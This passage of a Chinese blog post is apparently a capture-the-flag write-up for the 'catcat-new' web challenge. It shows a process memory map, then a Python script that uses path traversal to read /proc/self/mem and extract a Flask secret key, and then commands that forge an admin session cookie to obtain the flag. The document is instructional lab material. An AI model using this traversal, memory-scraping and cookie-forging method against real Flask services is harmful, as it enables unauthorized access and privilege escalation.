/usr/local/lib/python3.7/lib-dynload/_sha3.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083db000-7f82083dd000 rw-p 00018000 fd:00 23480903 /usr/local/lib/python3.7/lib-dynload/_sha3.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083dd000-7f82083df000 r--p 00000000 fd:00 23480868 /usr/local/lib/python3.7/lib-dynload/_blake2.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083df000-7f82083e6000 r-xp 00002000 fd:00 23480868 /usr/local/lib/python3.7/lib-dynload/_blake2.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083e6000-7f82083e8000 r--p 00009000 fd:00 23480868 /usr/local/lib/python3.7/lib-dynload/_blake2.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083e8000-7f82083e9000 r--p 0000a000 fd:00 23480868 /usr/local/lib/python3.7/lib-dynload/_blake2.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083e9000-7f82083ea000 rw-p 0000b000 fd:00 23480868 /usr/local/lib/python3.7/lib-dynload/_blake2.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083ea000-7f820845f000 r--p 00000000 fd:00 23348863 /lib/libcrypto.so.1.1</span><br><span class="line">7f820845f000-7f82085b6000 r-xp 00075000 fd:00 23348863 /lib/libcrypto.so.1.1</span><br><span class="line">7f82085b6000-7f820863a000 r--p 001cc000 fd:00 23348863 /lib/libcrypto.so.1.1</span><br><span class="line">7f820863a000-7f8208665000 r--p 0024f000 fd:00 23348863 /lib/libcrypto.so.1.1</span><br><span class="line">7f8208665000-7f8208667000 rw-p 0027a000 fd:00 23348863 /lib/libcrypto.so.1.1</span><br><span class="line">7f8208667000-7f820866b000 rw-p 00000000 00:00 0 </span><br><span class="line">7f820866b000-7f820866d000 r--p 00000000 fd:00 23480888 /usr/local/lib/python3.7/lib-dynload/_hashlib.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820866d000-7f8208671000 r-xp 00002000 fd:00 23480888 /usr/local/lib/python3.7/lib-dynload/_hashlib.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208671000-7f8208673000 r--p 00006000 fd:00 23480888 /usr/local/lib/python3.7/lib-dynload/_hashlib.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208673000-7f8208674000 r--p 00007000 fd:00 23480888 /usr/local/lib/python3.7/lib-dynload/_hashlib.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208674000-7f8208675000 rw-p 00008000 fd:00 23480888 /usr/local/lib/python3.7/lib-dynload/_hashlib.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208675000-7f8208678000 r--p 00000000 fd:00 23480922 /usr/local/lib/python3.7/lib-dynload/math.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208678000-7f8208680000 r-xp 00003000 fd:00 23480922 /usr/local/lib/python3.7/lib-dynload/math.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208680000-7f8208682000 r--p 0000b000 fd:00 23480922 /usr/local/lib/python3.7/lib-dynload/math.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208682000-7f8208683000 r--p 0000c000 fd:00 23480922 /usr/local/lib/python3.7/lib-dynload/math.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208683000-7f8208685000 rw-p 0000d000 fd:00 23480922 /usr/local/lib/python3.7/lib-dynload/math.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208685000-7f8208688000 r--p 00000000 fd:00 23480205 /usr/lib/liblzma.so.5.2.5</span><br><span class="line">7f8208688000-7f820869b000 r-xp 00003000 fd:00 23480205 /usr/lib/liblzma.so.5.2.5</span><br><span class="line">7f820869b000-7f82086a6000 r--p 00016000 fd:00 23480205 /usr/lib/liblzma.so.5.2.5</span><br><span class="line">7f82086a6000-7f82086a7000 r--p 00020000 fd:00 23480205 /usr/lib/liblzma.so.5.2.5</span><br><span class="line">7f82086a7000-7f82086a8000 rw-p 00021000 fd:00 23480205 /usr/lib/liblzma.so.5.2.5</span><br><span class="line">7f82086a8000-7f82086aa000 r--p 00000000 fd:00 23480171 /usr/lib/libbz2.so.1.0.8</span><br><span class="line">7f82086aa000-7f82086b3000 r-xp 00002000 fd:00 23480171 /usr/lib/libbz2.so.1.0.8</span><br><span class="line">7f82086b3000-7f82086b5000 r--p 0000b000 fd:00 23480171 /usr/lib/libbz2.so.1.0.8</span><br><span class="line">7f82086b5000-7f82086b6000 r--p 0000c000 fd:00 23480171 /usr/lib/libbz2.so.1.0.8</span><br><span class="line">7f82086b6000-7f82086b7000 rw-p 0000d000 fd:00 23480171 /usr/lib/libbz2.so.1.0.8</span><br><span class="line">7f82086b7000-7f82086f7000 rw-p 00000000 00:00 0 </span><br><span class="line">7f82086f8000-7f820871a000 rw-p 00000000 00:00 0 </span><br><span class="line">7f820871b000-7f8208721000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8208721000-7f820872a000 r--p 00000000 fd:00 23480907 /usr/local/lib/python3.7/lib-dynload/_ssl.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820872a000-7f8208733000 r-xp 00009000 fd:00 23480907 /usr/local/lib/python3.7/lib-dynload/_ssl.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208733000-7f820873a000 r--p 00012000 fd:00 23480907 /usr/local/lib/python3.7/lib-dynload/_ssl.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820873a000-7f820873b000 r--p 00018000 fd:00 23480907 /usr/local/lib/python3.7/lib-dynload/_ssl.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820873b000-7f8208740000 rw-p 00019000 fd:00 23480907 /usr/local/lib/python3.7/lib-dynload/_ssl.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208740000-7f8208744000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8208744000-7f8208745000 r--p 00000000 fd:00 23480921 /usr/local/lib/python3.7/lib-dynload/grp.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208745000-7f8208746000 r-xp 00001000 fd:00 23480921 /usr/local/lib/python3.7/lib-dynload/grp.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208746000-7f8208747000 r--p 00002000 fd:00 23480921 /usr/local/lib/python3.7/lib-dynload/grp.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208747000-7f8208748000 r--p 00002000 fd:00 23480921 /usr/local/lib/python3.7/lib-dynload/grp.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208748000-7f8208749000 rw-p 00003000 fd:00 23480921 /usr/local/lib/python3.7/lib-dynload/grp.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208749000-7f8208796000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8208796000-7f8208799000 r--p 00000000 fd:00 23348866 /lib/libz.so.1.2.11</span><br><span class="line">7f8208799000-7f82087a7000 r-xp 00003000 fd:00 23348866 /lib/libz.so.1.2.11</span><br><span class="line">7f82087a7000-7f82087ae000 r--p 00011000 fd:00 23348866 /lib/libz.so.1.2.11</span><br><span class="line">7f82087ae000-7f82087af000 r--p 00017000 fd:00 23348866 /lib/libz.so.1.2.11</span><br><span class="line">7f82087af000-7f82087b0000 rw-p 00018000 fd:00 23348866 /lib/libz.so.1.2.11</span><br><span class="line">7f82087b0000-7f82087b2000 r--p 00000000 fd:00 23480936 /usr/local/lib/python3.7/lib-dynload/zlib.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82087b2000-7f82087b5000 r-xp 00002000 fd:00 23480936 /usr/local/lib/python3.7/lib-dynload/zlib.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82087b5000-7f82087b7000 r--p 00005000 fd:00 23480936 /usr/local/lib/python3.7/lib-dynload/zlib.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82087b7000-7f82087b8000 r--p 00006000 fd:00 23480936 /usr/local/lib/python3.7/lib-dynload/zlib.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82087b8000-7f82087ba000 rw-p 00007000 fd:00 23480936 /usr/local/lib/python3.7/lib-dynload/zlib.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82087ba000-7f82087be000 r--p 00000000 fd:00 23480897 /usr/local/lib/python3.7/lib-dynload/_pickle.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82087be000-7f82087d3000 r-xp 00004000 fd:00 23480897 /usr/local/lib/python3.7/lib-dynload/_pickle.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82087d3000-7f82087d8000 r--p 00019000 fd:00 23480897 /usr/local/lib/python3.7/lib-dynload/_pickle.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82087d8000-7f82087d9000 r--p 0001d000 fd:00 23480897 /usr/local/lib/python3.7/lib-dynload/_pickle.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82087d9000-7f82087dc000 rw-p 0001e000 fd:00 23480897 /usr/local/lib/python3.7/lib-dynload/_pickle.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82087dc000-7f82087e4000 rw-p 00000000 00:00 0 </span><br><span class="line">7f82087e4000-7f82087e7000 r--p 00000000 fd:00 23480908 /usr/local/lib/python3.7/lib-dynload/_struct.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82087e7000-7f82087ed000 r-xp 00003000 fd:00 23480908 /usr/local/lib/python3.7/lib-dynload/_struct.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82087ed000-7f82087f0000 r--p 00009000 fd:00 23480908 /usr/local/lib/python3.7/lib-dynload/_struct.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82087f0000-7f82087f1000 r--p 0000b000 fd:00 23480908 /usr/local/lib/python3.7/lib-dynload/_struct.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82087f1000-7f82087f3000 rw-p 0000c000 fd:00 23480908 /usr/local/lib/python3.7/lib-dynload/_struct.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82087f3000-7f820884e000 rw-p 00000000 00:00 0 </span><br><span class="line">7f820884e000-7f8208850000 r--p 00000000 fd:00 23480890 /usr/local/lib/python3.7/lib-dynload/_json.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208850000-7f8208857000 r-xp 00002000 fd:00 23480890 /usr/local/lib/python3.7/lib-dynload/_json.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208857000-7f8208859000 r--p 00009000 fd:00 23480890 /usr/local/lib/python3.7/lib-dynload/_json.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208859000-7f820885a000 r--p 0000a000 fd:00 23480890 /usr/local/lib/python3.7/lib-dynload/_json.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820885a000-7f820885b000 rw-p 0000b000 fd:00 23480890 /usr/local/lib/python3.7/lib-dynload/_json.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820885b000-7f8208866000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8208866000-7f8208867000 r--p 00000000 fd:00 44325187 /usr/local/lib/python3.7/site-packages/markupsafe/_speedups.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208867000-7f8208868000 r-xp 00001000 fd:00 44325187 /usr/local/lib/python3.7/site-packages/markupsafe/_speedups.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208868000-7f8208869000 r--p 00002000 fd:00 44325187 /usr/local/lib/python3.7/site-packages/markupsafe/_speedups.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208869000-7f820886a000 r--p 00002000 fd:00 44325187 /usr/local/lib/python3.7/site-packages/markupsafe/_speedups.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820886a000-7f820886b000 rw-p 00003000 fd:00 44325187 /usr/local/lib/python3.7/site-packages/markupsafe/_speedups.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820886b000-7f82089ca000 rw-p 00000000 00:00 0 </span><br><span class="line">7f82089ca000-7f82089cb000 r--p 00000000 fd:00 23480889 /usr/local/lib/python3.7/lib-dynload/_heapq.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82089cb000-7f82089cc000 r-xp 00001000 fd:00 23480889 /usr/local/lib/python3.7/lib-dynload/_heapq.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82089cc000-7f82089cd000 r--p 00002000 fd:00 23480889 /usr/local/lib/python3.7/lib-dynload/_heapq.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82089cd000-7f82089ce000 r--p 00002000 fd:00 23480889 /usr/local/lib/python3.7/lib-dynload/_heapq.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82089ce000-7f82089d0000 rw-p 00003000 fd:00 23480889 /usr/local/lib/python3.7/lib-dynload/_heapq.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82089d0000-7f82089d3000 rw-p 00000000 00:00 0 </span><br><span class="line">7f82089d3000-7f82089d5000 r--p 00000000 fd:00 23480065 /lib/libuuid.so.1.3.0</span><br><span class="line">7f82089d5000-7f82089d9000 r-xp 00002000 fd:00 23480065 /lib/libuuid.so.1.3.0</span><br><span class="line">7f82089d9000-7f82089da000 r--p 00006000 fd:00 23480065 /lib/libuuid.so.1.3.0</span><br><span class="line">7f82089da000-7f82089db000 r--p 00006000 fd:00 23480065 /lib/libuuid.so.1.3.0</span><br><span class="line">7f82089db000-7f82089dc000 rw-p 00007000 fd:00 23480065 /lib/libuuid.so.1.3.0</span><br><span class="line">7f82089dc000-7f82089dd000 r--p 00000000 fd:00 23480914 /usr/local/lib/python3.7/lib-dynload/_uuid.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82089dd000-7f82089de000 r-xp 00001000 fd:00 23480914 /usr/local/lib/python3.7/lib-dynload/_uuid.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82089de000-7f82089df000 r--p 00002000 fd:00 23480914 /usr/local/lib/python3.7/lib-dynload/_uuid.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82089df000-7f82089e0000 r--p 00002000 fd:00 23480914 /usr/local/lib/python3.7/lib-dynload/_uuid.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82089e0000-7f82089e1000 rw-p 00003000 fd:00 23480914 /usr/local/lib/python3.7/lib-dynload/_uuid.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82089e1000-7f8208a7b000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8208a7b000-7f8208a7d000 r--p 00000000 fd:00 23480892 /usr/local/lib/python3.7/lib-dynload/_lzma.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208a7d000-7f8208a80000 r-xp 00002000 fd:00 23480892 /usr/local/lib/python3.7/lib-dynload/_lzma.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208a80000-7f8208a82000 r--p 00005000 fd:00 23480892 /usr/local/lib/python3.7/lib-dynload/_lzma.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208a82000-7f8208a83000 r--p 00006000 fd:00 23480892 /usr/local/lib/python3.7/lib-dynload/_lzma.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208a83000-7f8208a85000 rw-p 00007000 fd:00 23480892 /usr/local/lib/python3.7/lib-dynload/_lzma.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208a85000-7f8208a87000 r--p 00000000 fd:00 23480869 /usr/local/lib/python3.7/lib-dynload/_bz2.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208a87000-7f8208a89000 r-xp 00002000 fd:00 23480869 /usr/local/lib/python3.7/lib-dynload/_bz2.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208a89000-7f8208a8a000 r--p 00004000 fd:00 23480869 /usr/local/lib/python3.7/lib-dynload/_bz2.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208a8a000-7f8208a8b000 r--p 00004000 fd:00 23480869 /usr/local/lib/python3.7/lib-dynload/_bz2.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208a8b000-7f8208a8c000 rw-p 00005000 fd:00 23480869 /usr/local/lib/python3.7/lib-dynload/_bz2.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208a8c000-7f8208c6e000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8208c6e000-7f8208ccd000 r--p 00000000 fd:00 23480353 /usr/local/lib/libpython3.7m.so.1.0</span><br><span class="line">7f8208ccd000-7f8208e68000 r-xp 0005f000 fd:00 23480353 /usr/local/lib/libpython3.7m.so.1.0</span><br><span class="line">7f8208e68000-7f8208f14000 r--p 001fa000 fd:00 23480353 /usr/local/lib/libpython3.7m.so.1.0</span><br><span class="line">7f8208f14000-7f8208f1a000 r--p 002a5000 fd:00 23480353 /usr/local/lib/libpython3.7m.so.1.0</span><br><span class="line">7f8208f1a000-7f8208f82000 rw-p 002ab000 fd:00 23480353 /usr/local/lib/libpython3.7m.so.1.0</span><br><span class="line">7f8208f82000-7f8208fa3000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8208fa3000-7f8208fb8000 r--p 00000000 fd:00 23348860 /lib/ld-musl-x86_64.so.1</span><br><span class="line">7f8208fb8000-7f8209000000 r-xp 00015000 fd:00 23348860 /lib/ld-musl-x86_64.so.1</span><br><span class="line">7f8209000000-7f8209036000 r--p 0005d000 fd:00 23348860 /lib/ld-musl-x86_64.so.1</span><br><span class="line">7f8209036000-7f8209037000 r--p 00092000 fd:00 23348860 /lib/ld-musl-x86_64.so.1</span><br><span class="line">7f8209037000-7f8209038000 rw-p 00093000 fd:00 23348860 /lib/ld-musl-x86_64.so.1</span><br><span class="line">7f8209038000-7f820903b000 rw-p 00000000 00:00 0 </span><br><span class="line">7fff969ea000-7fff96a0b000 rw-p 00000000 00:00 0 [stack]</span><br><span class="line">7fff96a87000-7fff96a8a000 r--p 00000000 00:00 0 [vvar]</span><br><span class="line">7fff96a8a000-7fff96a8c000 r-xp 00000000 00:00 0 [vdso]</span><br><span class="line">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall]</span><br></pre></td></tr></table></figure>
+
+<p>从中寻找开始地址和结束地址并带入&#x2F;proc&#x2F;self&#x2F;men中去查找secret_key，代码如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re,requests</span><br><span class="line">line=<span class="built_in">open</span>(file=<span class="string">&quot;maps.text&quot;</span>,mode=<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">file_date=line.readlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> lines <span class="keyword">in</span> file_date:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;rw&#x27;</span> <span class="keyword">in</span> lines:</span><br><span class="line">        addr = re.search(<span class="string">&#x27;([0-9a-f]+)-([0-9a-f]+)&#x27;</span>, lines)</span><br><span class="line">        start = <span class="built_in">int</span>(addr.group(<span class="number">1</span>), <span class="number">16</span>)</span><br><span class="line">        end = <span class="built_in">int</span>(addr.group(<span class="number">2</span>), <span class="number">16</span>)</span><br><span class="line">        <span class="built_in">print</span>(start, end)</span><br><span class="line">        url = <span class="string">f&quot;http://61.147.171.105:59773/info?file=../../../../proc/self/mem&amp;start=<span class="subst">&#123;start&#125;</span>&amp;end=<span class="subst">&#123;end&#125;</span>&quot;</span></span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        secret_key = re.findall(<span class="string">&quot;[a-z0-9]&#123;32&#125;\*abcdefgh&quot;</span>, response.text)</span><br><span class="line">        <span class="keyword">if</span> secret_key:</span><br><span class="line">            <span class="built_in">print</span>(secret_key)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>得到secret_key</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cff65a3817204001ad76ae1e8cb13484*abcdefgh</span><br></pre></td></tr></table></figure>
+
+
+
+<p>接下来伪造flask_session，首先使用工具对cookie值中保存的session进行解密</p>
+<p>首先获取请求cookie值eyJhZG1pbiI6MH0.ZYgsLg.pV_q1l7XRYFtpUxbQIMozaQ6H5c</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py  decode -s &quot;cff65a3817204001ad76ae1e8cb13484*abcdefgh&quot; -c &quot;eyJhZG1pbiI6MH0.ZYgsLg.pV_q1l7XRYFtpUxbQIMozaQ6H5c&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Web%E7%B3%BB%E5%88%97%E4%B9%8Bcatcat-new/image-20231224220820115.png" class title="image-20231224220820115">
+
+<p>解密后得到{‘admin’:0}</p>
+<p>这里需要将admin的值修改为1，所以需要对其进行加密生成cookie，如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py  encode -s &quot;cff65a3817204001ad76ae1e8cb13484*abcdefgh&quot; -t &quot;&#123;&#x27;admin&#x27;:1&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>得到session值为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhZG1pbiI6MX0.ZYg81w.EwaiU-aGRzeNiuCeME1rBic-cVI</span><br></pre></td></tr></table></figure>
+
+
+
+<p>将请求报文中的cookie修改为以上值请求获取flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">catctf&#123;Catch_the_c4t_HaHa&#125;</span><br></pre></td></tr></table></figure>
+ 
+      <!-- reward -->
+      
+      <div id="reword-out">
+        <div id="reward-btn">
+          打赏
+        </div>
+      </div>
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Web%E7%B3%BB%E5%88%97%E4%B9%8Bcatcat-new/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF-Web/" rel="tag">-CTF -Web</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Reverse%E7%B3%BB%E5%88%97%E4%B9%8Bre1/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            【攻防世界】Reverse系列之re1
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2024/01/17/ROP%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E6%88%98%E6%95%99%E5%AD%A6/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">ROP的基本原理和实战教学</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.staticfile.org/valine/1.4.16/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "BAHT50PldtBLrMFvOb5LqqlL-gzGzoHsz",
+    app_key: "tj3HfiFvtJ3pRIhgXGBqdN7b",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2021-2024
+        <i class="ri-heart-fill heart_icon"></i> John Doe
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/haoyun.ico" alt="小透的少年江湖"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags/%E6%97%85%E8%A1%8C/">旅行</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="http://haoyun-forever.lofter.com/">摄影</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>让我给大家分享喜悦吧！</p>
+  <div class="reward-box">
+    
+    
